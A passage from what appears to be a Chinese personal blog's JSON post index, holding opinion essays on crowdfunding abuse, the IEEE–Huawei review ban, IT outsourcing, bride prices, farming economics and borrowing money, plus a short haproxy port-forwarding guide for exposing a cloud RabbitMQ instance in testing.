轻松筹、水滴筹已经不是帮助穷人解决大病问题的平台，现在很多明明很有钱的中产都开始利用这些平台筹款，明明家里几套房，豪车几辆也跑来乞讨式的利益网友爱心捐款，真的很可耻，自己不想花一分钱，不想降低生活质量，利用别人的钱给自己免费办事。比如罗一笑事件。 一名用户发起众筹要求治疗自己的“强迫症”，筹款金额最初高达60万元。结果这一众筹项目遭到各路网友的冷嘲热讽。多次调整资金目标之后，网友捐助依然只有一百块出头，这时这位用户终于干了一件颇有“强迫症”精神的事——先是将众筹目标改为102元，准备在交完2%手续费后拿100元走人，后来发现这样做应交的手续费其实是2.04元，于是又把目标再次改到105元，终于提现走人，消失在网友的视野中。“ 这些平台审核资源极其不严格，也不会对筹款人的家庭资产进行审核，导致很多人钻空子，另外这些平台本身也存在很多问题，因此，让我不再相信这些网络捐款活动。 不管是轻松筹还是什么筹本质都是一家商业性质的公司，不是公益。 另外对于筹款人，自己先把社保给缴纳了，哪怕花费 10 万，你自己也掏不了多少钱，扣除起付线和自费部分其实花不了多少钱的，在给自己办个商业保险，别几万块钱都跑来筹款真丢人。","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://awen.me/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"IEEE 禁止华为参与学术编辑和审稿，学术真的无国界吗？ ","slug":"IEEE-禁止华为参与学术编辑和审稿，学术真的无国界吗？","date":"2019-05-29T11:31:59.000Z","updated":"2021-02-26T06:05:29.248Z","comments":true,"path":"posts/22462.html","link":"","permalink":"https://awen.me/posts/22462.html","excerpt":"","text":"华为被禁止参与学术活动日前，华为被禁止作为editor 和reviewer参与学术活动（已有的编辑不允许处理任何论文），直到被BIS移除。吃瓜群众一脸懵逼，不禁问了几个问题什么是 IIEE？他是做啥子的？为什么他要禁止华为参与学术活动。 什么是 IEEE电气电子工程师学会（英语：Institute of Electrical and Electronics Engineers，简称为IEEE，是一个建立于1963年1月1日的国际性电子技术与电子工程师协会，亦是世界上最大的专业技术组织之一，拥有来自175个国家的42万会员。 IEEE定位在“科学和教育，并直接面向电子电气工程、通讯、计算机工程、计算机科学理论和原理研究的组织，以及相关工程分支的艺术和科学”。为了实现这一目标，IEEE承担着多个科学期刊和会议组织者的角色。它也是一个广泛的工业标准开发者，主要领域包括电能、能源、生物技术和保健、信息技术、信息安全、通讯、消费电子、运输、航天技术和纳米技术。在教育领域IEEE积极发展和参与，例如在高等院校推行电子工程课程的学校授权体制。 IEEE出版了全世界电子和电气还有计算机科学领域30%的文献，另外它还制定了超过900个现行工业标准。每年它还发起或者合作举办超过300次国际技术会议。 我们所熟悉的各种计算机标准，例如 POSIX、无线网络（802\\802.11）、生成树协议、等等标准都是 IEEE 制定的。 译文如下： 亲爱的主编们： 美国已将华为列入 “实体名单”。因此，我们无法让华为的同事作为审稿人或者编辑对我们的期刊进行同行评审 (详见附件 IEEE FAQ 文档第 12 项)。如果我们继续这样做，可能会产生严重的法律影响。 从 FAQ 文件里的同一段内容来看，我们似乎可以让华为的同事留在我们的编辑委员会，但他们不能参与任何论文的审阅，直到华为从 BIS 名单中删除。 在这个时候，我认为我们别无选择，只能遵守这些新规定，我强烈建议这种做法。我建议采取以下步骤： 如果你们的编辑部有华为的同事，请先告知他们，并向他们说明情况。一旦你通知了这些编辑，请给所有编辑发邮件，告诉他们不能再让华为的同事做审稿员了。如果现在华为的同事手上刚好有被分配的论文，请建议他们找其他人代替一下。 专家评论从邮件和其附件文档中不难看出，全球最大的非营利专业技术学会 IEEE 已将矛头直指华为。对此，南京大学周志华教授也发布朋友圈表示： 竟然不允许华为的专家给IEEE期刊处理稿件审稿了。赤裸裸地干涉学术。IEEE只是在美国注册，建议圈内IEEE各级管理层的专家向IEEE提议改到瑞士之类去注册。更重要的是，大家多支持国内优秀期刊（不仅中文刊，尤其是国内出版的英文国际期刊），例如《中国科学：信息科学》、计算机的《FCS》、综合的《NSR》等 杜克大学陈怡然： 你有拿过华为的科研经费也不能作为审稿人。以后各个国际会议技术委员会里面的国内老师们可以集体退群了。 学术真的无国界吗在此之前，华为一直有与 IEEE 合作，下图是华为官网搜索关键词 IEEE 的结果。 这里引用鲁迅的一段话： 我翻开历史一查，这历史没有年代。歪歪斜斜的每页上都写着“仁义道德”几个字，我横竖睡不着，仔细看了半夜，才从字缝里看出来，满本上都写着两个字“吃人”！—《狂人日记》","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://awen.me/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"谷歌临时工 12 万，外包员工出路在哪里","slug":"谷歌临时工-12-万，外包员工出路在哪里","date":"2019-05-29T09:20:15.000Z","updated":"2021-02-26T06:05:29.358Z","comments":true,"path":"posts/40417.html","link":"","permalink":"https://awen.me/posts/40417.html","excerpt":"","text":"谷歌临时工比正式员工还多 2 万自从互联网诞生开始进入商业领域运后，很多国内外的高科技公司一直对外宣传他们的企业文化，最常见的关键词就是“扁平化管理”，“高福利”，“高薪资”，“平等”，”人性化” 等等。与传统企业相比较，高科技企业的风格总是很令人憧憬和向往。 谷歌公司，为员工提供免费交通车，以及奢华的食堂，每栋大楼都有咖啡厅和餐厅，每个餐饮都有自己的餐饮风格，来满足世界各地的员工；还有健身房、单车、排球、篮球、保龄球、攀岩等各项运动设施；除了运动，各种钢琴、架子鼓等音乐器材也是应有尽有；工作极度灵活，岗位不固定，非常自由。 惠普公司，午饭后为员工提供水果，还是进口的，吃不完可以打包带走；一天只工作五六个小时，每年都有带薪休假，以及两次体检；让高管花80%的时间用在帮助员工解决问题上。 微软今年在日本试行“做四天休三天”新工作制度，并发放6000元补贴。 国内一些互联网巨头也开始纷纷效仿国外的互联网企业，例如 BAT 都为员工提供免费的班车。此外，一些公司，比如网易，一直在外界被称为猪场，因为其为员工提供一天三顿的免费工作餐，此外如果你加班到很晚，还能吃个免费的夜宵在回去。 看完是不是很羡慕，觉得在这些高科技企业工作简直太幸福了、太人性化了。 然而，你知道吗？以提供令人艳羡的薪酬和丰厚的福利而闻名的谷歌公司，最近的一份内部文件显示，截至今年3月，谷歌在全球的临时工、承包商人数已经超过其全职员工，分别为12.1万人和10.2万人。临时工还比正式员工多 2 万。谷歌的临时工和合同工数量已超出全职员工，这种越来越依赖于非正式员工的做法让人们感到不安。 这些临时工赚的钱少，享受的福利待遇也与正式员工不同，没有带薪休假时间，甚至不能参加假日聚会和全体员工大会。 业内人士称，现在是时候结束“把一些工人当作牺牲品”的“两级制度”。从拼车司机，到自助餐厅的工人，再到制造和维护科技产品的众多合同工，他们同样做出了贡献，有资格享受同样的待遇。 这些临时工就是我们国内俗称的外包公司。在国内，当企业规模达到一定程度后，或多或少都会将自己的一些非核心业务承包出去，我们所熟知的运营商、银行、头部互联网企业都一定程度依赖外包公司为其提供相应的服务。 什么是外包所谓的外包，是指企业动态地配置自身和其他企业的功能和服务，并利用企业外部的资源为企业内部的生产和经营服务。 外包是一个战略管理模型，所谓外包（Outsourcing），在讲究专业分工的二十世纪末，企业为维持组织竞争核心能力，且因组织人力不足的困境，可将组织的非核心业务委托给外部的专业公司，以降低营运成本，提高品质，集中人力资源，提高顾客满意度。 在全球信息化浪潮的强烈推动下，软件产业在全球范围内已经发展成为一个规模庞大、最具活力的产业。２００９年，全球软件外包规模在８００亿美元，到２０１７年，全球软件外包规模达到２２００亿美元。全球软件外包行业经过快速增长状态后，目前增长率趋缓，增长率仍然在接近１０％左右。 近年来，我国软件服务外包市场在国家优惠财税重点政策支持下，整体上增长非常快速。2010-2016年我国软件与信息服务外包产业规模不断提升，年均复合增长率约为15%。至2016年我国软件外包产业规模达到1.11万亿元，2017年全年软件外包行业规模继续增加约为1.25万亿元，软件外包业务占软件业务总收入的20%以上。 对于企业而言，外包最大的优势就是成本优势，包括财务成本和管理成本，目标是提升自身的核心竞争力，外包使得发包方更专注于核心业务，比如对于运营商而言，客服系统就是他们的非核心业务，将其外包出去，可以节省企业很大的成本，如管理成本、人力成本等。此外一些高科技公司也会将自己的一些非核心业务承包出去，也就是软件外包。这些非核心业务所需要的技术含量不高，且重复性、繁琐。 这里我们着重介绍下软件外包中的人力资源外包，也就是劳务外包。 劳务外包的优劣中国IT软件服务行业虽然快速发展,然而却正面临着企业规模小、管理水平低、技术水平差，层次低、竞争激烈等诸多问题。一般来说劳务外包的流程如下: 劳务外包是指企业将其部分业务或职能工作发包给相关机构，由该机构自行安排人员按照企业的要求完成相应的业务和工作。和传统的劳务派遣不同，外包企业独立运营，独立管理，与发包企业之间按照合同承担权利义务，发包企业不再对外包企业员工承担连带责任，这点上，外包企业的用工方式保留了劳务派遣的优点，又巧妙地规避了劳动法律法规对劳务派遣用工的限制。 劳务外包对企业来说可以解决一部分成本问题，最新社保改革规定，对劳务外包人员用工企业（发包方）可以不缴纳社保，因此对企业来说通过这种方式，有以下几点优势： 1.成本低廉，提高企业效益。通过外包，可以为企业节省大量办公费用，降低企业资源支出，免去企业管理者相关人事管理流程中大量机械重复性的工作，使管理者能投入到其它能使企业有效增值的管理活动中。刘强东就曾表示如果采用外包可以多赚 50 亿人民币。 2.服务全面，提高效率。让专业的人来做自己不擅长的事情。 3.降低用人风险。与劳务派遣相比，用人单位(发包方)不用承担连带责任。 举个例子，一家公司需要做一个非核心的项目，比如一个管理系统，需要 5 名开发人员，于是将这个需求提供给外包公司，按照一个人 15000 的薪资发包，外包公司接到需求后，按照 6000 的薪资去市场上招聘并与招聘的员工签订合同缴纳社保等。签订合同后会派遣该员工入驻发包方企业进行工作。待项目结束验收完毕，外包员工从发包企业撤出，等待被分配至其他发包公司工作。对于企业而言，劳务外包的优势显而易见。 外包对于企业而言有很多优势，但是对于对于外包公司的员工来说，在实际操作中，劳务外包也是五花八门，有就劳动者服务费进行外包而不管劳动者实际工资标准的；有按照小时或者天数工作时长进行计费的；有混岗操作和同类岗位操作的；有现场实际管理权在发包方的等等乱象，可以说大多数的劳务外包实操都游离在法律边缘。 外包公司的员工通常会感觉寄人篱下，没有归属感，且与正式员工干着相同的活，但是却享受不到正式员工的的待遇和福利。举个例子，每逢佳节，正式员工会有一些礼品，红包，这些外包员工只能一边看着，年会之类的更别说了，直接说明正式员工才可以参加。至于年终奖之类的更是与外包员工无缘。 什么样的人会进外包企业那么既然外包行业福利待遇远不及正式员工，不去不就行了吗？为什么还有这么多人选择去外包企业。 一般互联网巨头招聘通常都是在 985 211 等名校招聘，即使是社会招聘也是需要工作经历丰富的人才，而其他的普通本科、专科院校的学生是很难通过校招渠道进入名企的，再加上国内的教育资源大多倾斜于这些名校，以计算机专业为例在校学的知识都偏理论且纷繁复杂，什么都学一点，所学技术与企业实际应用脱节，因此很多学生在毕业后还会选择去培训机构再针对性的学习一段时间，而有些培训机构则打着包分配包就业的招生口号，待学员学完之后通常就会被推荐到一些软件外包公司工作。 另外就是一些转行做开发的进入外包起点会比较低。他们进入一般企业做开发缺乏经验且能力不足，因此退而求其次进入外包公司先从事简单的开发工作，积攒经验，也算是一条入门软件开发的渠道。 是否需要逃离外包网上很多言论都是贬低外包行业和外包员工，外包行业当然存在一系列的问题，但是最关键还是你自己的问题，其实对于一些刚入行的学生和转行的以及能力尚还欠缺的人来说，如果确实没有合适的机会，外包公司也不一定就完全要避开，外包只是一种新型的工作模式，不管是在甲方还是乙方，个人能力的提升才是最重要的，一定要多提升自己。要摆在自己的心态，哪怕是在甲方，你也是要为你的客户服务的。其实任何行业都是需要不同的内部或外部支撑相互协调分工的，本质都是为自己的客户提供最优质的服务，企业选择外包的初衷是为了在市场化竞争中提升自己的核心竞争力，而员工同样也需要提升自己的核心竞争力。 举个我身边的例子，我一个朋友本科嵌入式专业毕业，希望进入互联网企业从事开发工作，于是找了一家知名的培训机构学了几个月 Java，培训完毕之后进入了一家国外的软件外包公司做 Java 开发，在和他聊天的过程中，他总是和我吐槽这家公司是给日本人做软件开发的，使用的Java 还是 1.6 版本。代码质量十分的差，每天的工作很大一部分都是重构代码，复制粘贴。学不到新技术，于是干了不到半年跳槽又换了一家，结果还是一家外包公司给海康威视做项目。薪资 10k，但是还是感觉学不到技术，于是干了不到 一年又跳槽了，最近一次和他联系，他的薪资已经超过 20k 了。 另外我还有一个朋友入职一家外包公司是给阿里做网络运维的，由于能力出众，被阿里聘用为正式的网络工程师。当然这个比率会比较少，因为有的外包公司会与企业签订一些协议，禁止互相直接挖人。 外包公司只是一种选择，关键还是看个人能力。其实，就算是大企业也有平庸的员工，也并不是所有大企业的全部岗位都是前途无限的。有的岗位甚至还不如外包员工能够积累经验和能力。因此网上很多言论对于外包行业以及外包员工的鄙视其实是没必要的。 本文仅授权 CSDN 使用，如需转载请联系 CSDN","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://awen.me/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"网易云公网访问 rabbitmq","slug":"网易云公网访问-rabbitmq","date":"2019-05-28T10:25:30.000Z","updated":"2021-02-26T06:05:29.352Z","comments":true,"path":"posts/60115.html","link":"","permalink":"https://awen.me/posts/60115.html","excerpt":"","text":"网易云的 rabbitmq kafka redis等默认都是不分配公网 IP 地址的，原因是因为这些中间件通常都是在局域网内部使用，放在公网安全性特别低，很容易被攻击，比如redis 之前就被曝出提权漏洞。另外就是公网访问的延迟比局域网大。所以不建议使用外网访问。 那么如果你的测试环境确实是需要本地调整这些中间件，怎么办呢？可以通过 OpenVPN 的方式，连接到相同 VPC 和安全组的内网去这种方式是最安全可靠的。 但是有时候我们觉得这个麻烦，而且一个测试环境觉得安全性要求也不是那么高，那我就想用公网访问，怎么办？我们接下来介绍下一种曲线救国的方案，那就是端口转发。好了，当你读到这里，如果你对端口转发有了解，那么你大可不必继续看下面的内容，自己去实践就 OK 了。 虽然这种方法可行，但是强烈不建议应用到生产环境中。 haproxy安装 haproxy，当然你用 nginx 或 iptables 的 NAT 都可以，随意 12# yum -y install haproxy# systemctl enable haproxy 编辑 /etc/haproxy/haproxy.cfg，删除所有内容，粘贴如下内容 1234567891011121314151617global ulimit-n 51200defaults log global mode tcp option dontlognull timeout connect 5000 timeout client 50000 timeout server 50000frontend ss-in bind *:56721 # rabbitmq 公网访问的端口 default_backend rabbitmqbackend rabbitmq server server1 nqsf9f18f24512a478c8fc072f620fd9d18.nqs.cn-east-1.internal:5672 maxconn 20480 # 后端 rabbitmq 的内网域名和端口 接下来重启 haproxy 1# systemctl restart haproxy 然后在对应的安全组内放行公网访问的端口和内网的 rabbitmq 的端口即可。 telnet 看下端口通不通，如果通的话就可以使用该公网 IP 和端口进行连接测试了。","categories":[],"tags":[{"name":"公有云","slug":"公有云","permalink":"https://awen.me/tags/%E5%85%AC%E6%9C%89%E4%BA%91/"}]},{"title":"寻根问祖之方姓由来","slug":"寻根问祖之方姓由来","date":"2019-05-27T11:46:45.000Z","updated":"2021-02-26T06:05:29.332Z","comments":true,"path":"posts/53462.html","link":"","permalink":"https://awen.me/posts/53462.html","excerpt":"","text":"方姓，为汉姓之一，在《百家姓》中排名第56位。 起源方姓的来源主要有以下几种： 方雷氏。为神农氏第8代孙帝榆罔子雷之后，以地名为氏。传说神农有后裔开始得雷姓。传至8代孙帝榆罔之子雷，黄帝伐蚩尤时，因功被封于方山（大致为今河南省叶县南），其后子孙有以地名为氏姓方。又有方相氏，黄帝时嫫母之后。亦为河南省方氏。 出自姬姓。为西周后期周宣王时大夫方叔之后，以祖字为氏。据《元和姓纂》及《通志·氏族略》等所载，西周后期宣王时，有大夫方叔，在征伐淮夷、猃狁，特别是平息南方荆蛮的叛乱中居功至伟，前823年奉周宣王之命南征楚国，大胜而还，周宣王封方叔于洛（今河南省洛阳市），其子孙以祖字为姓，称为方氏，史称方姓正宗。 徽州八大姓之一“徽州八大姓”是指“新安十五姓”中的前八姓，即程、汪、吴、黄、胡、王、李、方八大姓。 徽州“方氏”以方竑（西汉末丹阳县令，迁居歙县东乡）为始祖，后代名人主要有东汉名宦方储，唐代农民起义领袖方清，宋代农民起义领袖方腊、文学家方回，明代医学家方有执、制墨名家方于鲁，清代文学家方士庶、戏剧家方成培等。","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://awen.me/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"聊聊彩礼这个事儿","slug":"聊聊彩礼这个事儿","date":"2019-05-23T22:41:59.000Z","updated":"2021-02-26T06:05:29.354Z","comments":true,"path":"posts/11496.html","link":"","permalink":"https://awen.me/posts/11496.html","excerpt":"","text":"天价彩礼引发的血案最近看到一则新闻，是上个月发生在江西的，说的是一个男子借贷 40 万彩礼钱然后遭遇女方悔婚，一怒之下把女方杀了还肢解了女方。具体新闻看这里 血色彩礼，江西男子借贷40多万礼金遭女友悔婚不退，一怒将其杀害 从这个新闻中可以看出来双方的家庭条件其实都不好，都是社会底层，本身经济条件就差，但是男方为了娶老婆花了将近 60 万。 另外这次事件的主要原因是男方撒谎是导致女方想退婚的主要原因，但是新闻说当地找对象或多或少都会夸大自己的家境，后来给了女方彩礼，但是女方不乐意了，于是想退婚，而女方家里不乐意退还彩礼，后来退了30 多万还差 8 万，因为这个事情产生了分歧导致男方杀人，新闻是这样说的 许俊从开始的接叶叶回家转变到了上门讨要彩礼，他在与叶叶妈妈商量时，叶母说：“钱已经给我们用掉了，你抓我女儿回去吧！”后来叶家还表示，除了用掉的钱，其余钱都存在了叶叶的银行卡里。许俊从满怀希望的买车接叶叶回家，到无休止的讨要彩礼无果，他也从失望中磨去了耐心，变得愤怒无比，在双方父母还在为他们的亲事作努力时，许俊早生厌恶和不耐烦了。 叶叶从那天回了娘家后，就再也没有去过许家了，许家为了叶叶，前后花了40多万，为了接叶叶买的小车又花了13万，将近60万元，除了用老房子贷的款，余下都是借的，既然叶叶悔婚，那么好合好散必须归还许俊家的钱，但在归还钱款的数目上，双方产生了分歧，叶家称彩礼以及见面礼和金银首饰一起只有30多万，与许家要求归还的相差了8万多。为此，双方开始了拉锯战，并持续了十多天。 以前还看到过央视曝光的甘肃庆阳那边的天价彩礼，当地有个专门的“人市”，就是给单身男女相亲介绍对象的，这些地方女少男多，并且地方经济不好，每年彩礼都上涨，当时看新闻记得是说涨到 20 多万了，还必须有房有车。而且见面根本不谈感情，上来直接谈你家能给多少彩礼钱。如果可以给，迅速的就把婚礼给办了。在这些家庭眼里，女子就是他们的提款机。 视频链接 《新闻调查》 20150207 陇东婚事 为什么会出现这种情况？原因还是当地重男轻女，以前生了女娃都直接打掉，导致当地的人口比例失调，造成男多女少。 彩礼和彩礼还是有区别的我一个同事山东的，他说他们那边彩礼最高不超过 2 万，如果要多了，街坊邻居会笑话你这是卖女儿的，而且这个钱还是会返回给小两口的。 一般给彩礼的几种方式 男方给多少彩礼，一分不要，全退还给小两口； 男方给多少彩礼，女方陪嫁多少过来或者以其他方式，比如车子等陪嫁； 男方给了彩礼会返一部分，或多或少返回一部分； 男方给了彩礼，一分不退，也没任何嫁妆； 男方给的彩礼钱当嫁妆返给小两口； 彩礼为什么这么高我发现越是穷的地方，彩礼要的越高，而且一分不退的很多，而城市里一般不要彩礼或者要了也会把彩礼带回或同事在给女儿一份嫁妆，通常有以下几种情况： 重男轻女思想严重(这个东西并不会口头上说，而是观念和行为决定的)，觉得女儿始终都是要嫁人的，不是自己家的人，家里有弟弟或哥哥来养儿防老，那女儿不能白养啊，得从女儿身上把这些年的养育成本收回来补贴给哥哥或弟弟买房娶媳妇。这种情况一般发生在很穷的农村地区。 怕女儿去婆家吃亏，要点彩礼一来检验下对方的”诚意”，但是这种父母一般还是会把这个钱给女儿带回来的，但是这也分 2 种情况，一种是只是把彩礼带回来，另外一种是除了彩礼之外还额外给女儿一笔等额的钱当嫁妆。前者其实在我看来还是存在重男轻女的思想，因为他不会再女儿结婚这件事上花太多自己的钱，后者我认为是比较公平的家长。第一种情况现在农村也有，但是少，这种已经算比较通情达理的了，第二种多在城镇家庭或少部分富裕的农村家庭。 但是我觉得这个诚意是真的没法用彩礼来检测的，那些结了婚又离了婚的很大也给过彩礼啊，为什么最后还是离婚了。婚姻是需要靠双方互相经营的，而不是这一笔彩礼就可以稳定，更不是房子。有的男人事业成功了就抛妻，重新找个年轻漂亮的，他们肯定给得起彩礼啊。 为什么越穷的地方彩礼越高为什么城市里一般不要彩礼，而偏远农村彩礼却出奇的高，原因是因为传统的农村家庭生儿育女的最大作用就是”养儿防老”，参考传统社会为什么会有养儿防老，儿子是留给自己老了照顾自己给自己养老送终传宗接代的，而女儿呢？则是我上面说的提款机。如何看待11个姐姐凑钱给弟弟买房子结婚？ 这些父母都很自私，他们不在乎女儿嫁到婆家去会不会被看不起，过的好不好。只在乎眼前把女儿嫁出去能捞一笔是一笔。因为在他们的观念里，最开始就不应该是生个女儿，而是儿子。所以才敢要几十万的天价彩礼,而事实上他们这些家庭一年的收入都可能只有几万块钱。 我对彩礼的看法首先，我觉得彩礼是糟粕。 我向往的爱情是两个人互相看的顺眼，然后共同打拼，互相扶持，门当户对，双方条件都差不多，这样更容易互相尊重，也不会谁看不起谁，另外好的婚姻是需要双方互相经营的，而不是一方默默付出，另一方欣然接受，觉得理所应当。更不是一份彩礼就可以让婚姻变得更幸福美满的。 在结婚这件事情上尽量不给任何一方父母添太多麻烦，靠双方自己赚的钱买房，更踏实，如果父母有能力且乐意帮忙，也不是说就心安理得的接受，要记下心里，日后还回去，一来父母真的不欠子女的，二来对于我自己来说我不喜欢过着吃人嘴短拿人手短的日子，不希望看任何人脸色过日子，同时也拒绝和任何一方父母住一起。 我这个人不喜欢欠人东西，哪怕是借，我肯定会还回去并且不会让你吃亏的。我不希望双方任何一方的父母因为资助我钱买房什么的就来左右我自己的事情，这是我的底线。在很早之前我就跟我爸妈说过，我以后哪怕结婚我也不会跟你们住一起，因为我看透了身边那些婆媳住一起的各种奇葩事情，归根结底还是两代人之间的三观性格问题导致的各种小问题而引起的家庭矛盾。想想夫妻两个从相识相知相恋到结婚都需要很长时间磨合才行，更何况双方的家庭其他成员。能做的就是见面客客气气，该尽的义务尽好就行。 如果对方家庭真的是要彩礼，要的不多，比如几万块，最多不超过 10 万，我也会尊重当地风俗适当给点没啥毛病，哪怕这个钱不返，我也不觉得有什么问题，至于三金，给心爱的人买点首饰能力范围内我也不会心疼，但是如果要的特别多狮子大开口并且没有讨价还价的余地，而且女方家里还没有任何嫁妆之类的带过来返给小两口，这个彩礼钱是不会花在女儿身上，而是父母自己留着或给家里的弟弟或哥哥用的，我觉得这种婚也没必要结了，这种三观我无法接受，一般要彩礼很多，比如十几万、20 万 30 万以上的还一分不带回来的，有些地区本身就很穷，收入就不高，种地打工能挣多少钱？全农村收入人均可支配收入才 2 万多，开口就敢要这么高的彩礼，这明摆着是压榨未来女婿和女儿嘛！如果这个时候对象还站在她父母那边跟着一块要这么高的彩礼，那这婚还是不要结。想想看，这俩人要是结婚了，拿什么生活？这样过日子没什么意思，还不如单着更自由！ 这个社会变化太快，一份彩礼，一张结婚证根本无法保障婚姻幸福。我身边很多上半年结婚，下半年就离婚的多了去了。婚姻在我看来只是个非必须品，如果遇到合适的人，性格、三观都合得来，结婚我很愿意，但是如果三观不合，我不会强求的。总说女生需要安全感，这个社会谁不需要安全感？结婚是两个人过日子，如果不是互相信任，还没结婚就算计着离婚了自己能分到什么东西，这样的婚姻干嘛要继续。 在我的观念里没有传宗接代养儿防老这种老旧的观念，虽然我父母有，但是他们左右不了我的思想，所以我追求的婚姻并不是找个女的生娃就行。在我观念里，如果结婚对象愿意要孩子，我也不介意要一个，但是我最多只会要一个，如果对象觉得不想要，不想生，我也不会有任何抱怨。因此如果不合适，我不会刻意去挽救这种没有意义不符合我价值观的事情。虽然从经济学的角度看，婚姻就是一种纯粹的利益结合关系，但是我不这么认为。 所以以前家里给撮合相亲，我都直接拒绝，因为我觉得父母的眼光不如我，因为他们给我找对象的目的就是传宗接代养儿防老。","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://awen.me/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"为什么种地不赚钱","slug":"为什么种地不赚钱","date":"2019-05-18T02:01:39.000Z","updated":"2021-02-26T06:05:29.297Z","comments":true,"path":"posts/8291.html","link":"","permalink":"https://awen.me/posts/8291.html","excerpt":"","text":"一个农民，比如种一亩地，需要花费 100 小时时间，买 200 元的的肥料和种子成本，产生 100 公斤的粮食，那么要产生 10000 公斤的粮食就需要投入 10 亩地，10000 小时的劳动，2000 元的种子和肥料钱，为了生成更多的粮食，其成本投入也是逐渐上升的，每亩地所需要的劳动成本和成本投入是独立的，这就造成农业生成即使规模化也很难赚到钱。 而另外一些行业，比如互联网、基金公司、金融公司、网络游戏公司则不一样，比如腾讯，2016 年腾讯收入 1519 亿元，利润 561 亿元，3 万员工，人均创收 505 万元，而 2016 年中国农业生产总值 6.3 万亿，3 亿农民，人均 2.1 万元，腾讯员工人均创收是农民的 250 倍。这是因为腾讯公司所在的行业的产出函数不一样，农业的产出投入有着极其强的线性关系，这就导致农业的创收空间很小。而比如网络游戏之类的行业，其场景和任务设计一次后，后面就不需要投入太多的人力去做相同的事情了，比如你在王者荣耀里面买一个英雄，其他人也去买同样的英雄这并不需要增加开发人员和设计人员的工作量，哪怕买了一万个，这些开发和设计成本是几乎没有的。类似的还有滴滴打车平台、淘宝等购物平台。 如果你不知道去哪个行业发展，可以试试用产出跟投入关系这个视角去判断，一般，越是接近零边际成本的行业，待遇增长空间越大。","categories":[],"tags":[{"name":"读书笔记","slug":"读书笔记","permalink":"https://awen.me/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"}]},{"title":"谈一谈借钱这件事","slug":"谈一谈借钱这件事","date":"2019-05-17T14:16:07.000Z","updated":"2021-02-26T06:05:29.358Z","comments":true,"path":"posts/9879.html","link":"","permalink":"https://awen.me/posts/9879.html","excerpt":"","text":"最近2天在读《陈志武金融学通识》刚好读到第六章借贷，里面的一些观点和我对借贷这件事的观念非常相似。 书中举个例子说一个教授的内弟 2004 年想买在上海花 120 万买 150 平的房子，但是只有 30 万，还差 90 万，于是就找教授借了 20，然后还找父母借了 60 万的养老钱，另外还找其他亲戚借了 10 万。这是通过家族的渠道来融资，但是这里会存在一些问题，那就是一般来说问亲戚朋友借钱是不会谈利息的。而钱是有成本的，如果不约定利息，一方虽然嘴上不说，但是心里面会认为把钱借你是吃亏的，而且还要承担你不还钱的风险，即使是亲戚。如果不约定利息，那这笔钱就相当于零利息借出去了，借款方会认为这是亲戚理所应当的，这样其实不利于培养一个人的独立自主能力的。这就是典型的啃老。而对于借款方来说，就比如父母吧，本来 60 万的养老钱如果自己拿去理财，晚年生活会过的非常好，因为手有余粮心中不慌，而如果借了儿子，那么未来即使和儿子儿媳闹矛盾，你都得委屈求全的跟儿子一起过，因为你已经没钱了。你得看人脸色，而亲戚呢？其实我认为钱对于任何人来说都是不够的，挣五千的时候觉得要是挣一万就好了，可以存五千，而等你挣到一万了，你会发现你的开销不自觉的就变大了，这大概就是人性的贪婪吧，欲望永远无法得到满足！如果是借点小钱还能接受，大不了不还就算了，而大钱如果不还或长时间不还又不约定利息，时间一长会影响双方的感情，尤其是亲戚朋友之间。 而如果通过正规的金融渠道借钱，虽然有利息，但是却可以让借款方知道这笔钱并不是白来的，是需要付出成本的，而且有还贷压力会让一个人更加独立自主，当你每天想着该怎么去解决这个月的还款时，就潜在的逼迫你去想办法赚钱，从而提升自己的能力。对此我非常认同!人的潜能都是被糟糕的环境逼迫出来的。 2013 年底我打算转行，因为此前的工作薪资太低了，才 2000 多块钱。一年到除去日常花销根本存不到钱，在这种压力之下，我决定转行，可是手头没钱啊，我一开始又不好意思找父母借钱，加上家里出了点变故，我弟弟出了车祸，意外住了院，再加上我自己的自尊心，觉得这么大人了，也工作了，不能一辈子靠父母，于是一边先找份工作，3000 多一个月，一边利用培训机构的贷款分期付款，然后参加了 CCIE 培训，贷了 一万五千左右吧，加利息要还将近两万，分 24 期还，虽然每个月都要还款七八百，但是我深信这只是暂时的痛苦，未来一定会把这笔钱赚回来的。后来参加完培训，我通过兼职在线当讲师把所学的这些东西讲给其他人听，一节课 2000 块钱，把这笔培训费用给赚回来了，而且最重要的是通过参加这次培训我收获了很多专业知识，为以后的工作打下了夯实的基本功。 后来我觉得仅仅干网络配个路由交换是没啥前途的，总和职业发展考虑，于是就辞职脱产参加了一个 Java 培训，找了我爸借了一万块钱，但是我和他约定等参加完培训就分期按月给他，我也做到找到了工作并稳定了按时还他钱并且还完了。通过这些操作，我能够在较短的时间里从文科转行到互联网做技术，并且在这几年时间里薪资涨幅都挺不错的（相比较未转行之前），这其中的时间成本跟这点贷款利息相比现在看真不算啥，如果没有这些培训和分期服务，我还有可能只拿着几千块钱的薪水在艰难度日，虽然那段时间日子过得非常拮据，手头基本没什么钱，有时候都是靠信用卡拆东墙补西墙，但是毕竟是挺过来了。 而且我是通过自己的努力一步一步完成学习和找到工作的，打内心里觉得这是我靠自己的能力一步一步赚的钱，虽然不多，但是会觉得每一分都无比的珍贵！ 当然，我其实并不认为每个人都需要培训，只是对于我当时想转行没有门路，投简历要么石沉大海要么薪资低的可怜，只能选择培训这种较为快速的入门方式，我认为靠培训是不能让一个人在短短几个月里面就能精通某个行业的，还是师傅领进门，修行靠个人吧！尤其是技术性岗位是需要不断的练习和看书，需要花很多时间的。 这就是我对借钱的看法。除非真的是没办法，一般不轻易向人借钱，即使借也得做到诚信并约定好还款时间和利率，如果是好朋友借钱，可以在还钱后请他吃顿饭，表示感谢！不要以为像父母亲戚借钱没有成本，这其中的人情成本其实有时候真的比给商业贷款机构一点利息要高的多的多。。 